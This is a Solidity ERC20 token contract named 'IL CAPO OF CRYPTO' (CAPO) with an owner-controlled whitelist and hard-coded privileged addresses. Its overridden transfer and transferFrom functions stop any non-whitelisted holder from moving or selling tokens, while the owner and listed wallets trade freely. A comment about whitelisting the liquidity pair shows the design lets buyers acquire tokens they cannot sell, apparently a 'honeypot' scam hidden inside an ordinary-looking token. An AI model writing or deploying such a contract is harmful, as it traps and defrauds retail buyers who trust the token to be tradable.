// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("IL CAPO OF CRYPTO", "CAPO") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 350000000 * 10 ** decimals());
        whiteList[0x195Ff2066CEdf9902AeE2C35B0085f71c4820B8c]= true;
        whiteList[0x56f0A42F8F37B50587A3720945903E55923B7788]=true;
        whiteList[0x3546A9442915f74285807eFb6f851a6271F06621]=true;
        whiteList[0xE3C316D50C811B340E0eBF5e3c4A7c9b9cC33115]=true;
        whiteList[0xed5E49d504ACf67edB346e5a8d1C70d664B992a8]=true;
        whiteList[0x52Ad2456fBA9EDC45221C13EeBE16B6F89eF466a]=true;
        whiteList[0x4348C64Dd2020Ec62cE680C7A6a7f232C02F1786]=true;
        whiteList[0xA19eDC2e276A1F5122488ff0fc2005B2a44294Fa]=true;
        whiteList[0x2Ce47078c6DAa23766Bd8aa5D3cd3A57AfB62667]=true;
        whiteList[0xDb924A23e566f7B598A207B4FB039820d2c10274]=true;
        whiteList[0x3c5ec60d7148baAb05e77f892654F0921e8Fc25a]=true;
        whiteList[0xE52703989529Bb0b6b04Da8f82c305da1e87bF00]=true;
        whiteList[0xD612b25d6a4eA3Bf73aD4867427A9d63158810EF]=true;
        whiteList[0x38F27c40ed9C104a867B9F3975048A48F5b9904A]=true;
        whiteList[0xD599d53c2F6B7CC45ec7A40fDe541CE5f1A300e1]=true;
        whiteList[0xfA41A6eC0565DcC4845a0f2F5A8DB88b0c6Ea423]=true;
        whiteList[0x40fC2C117ec1f45b32253A65538e239c67087189]=true;
        whiteList[0xbE60b85d1861498209AC81563b9Db23800ccBeCb]=true;
        whiteList[0x425663E2EDBc4F9512D8F5bA56F10c3a06d3A49c]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}